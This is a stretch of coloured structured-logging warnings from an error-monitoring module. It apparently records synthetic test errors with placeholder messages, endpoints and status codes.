WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690943Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 138'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690993Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 139'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691041Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 140'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691090Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 141'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691138Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 142'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691187Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 143'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691235Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 144'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691282Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 145'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691330Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 146'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691379Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 147'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691426Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 148'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691473Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 149'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 150'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691568Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 151'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691615Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 152'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691662Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 153'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691787Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 154'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691851Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 155'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691904Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 156'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.691953Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 157'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692003Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 158'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692053Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 159'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692101Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 160'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692149Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 161'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692197Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 162'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692274Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 163'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692358Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 164'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692418Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 165'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692474Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 166'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692528Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 167'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692579Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 168'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692629Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 169'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692678Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 170'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692727Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 171'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692776Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 172'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692825Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 173'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692874Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 174'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692923Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 175'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.692972Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 176'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.693021Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m4[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 177'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
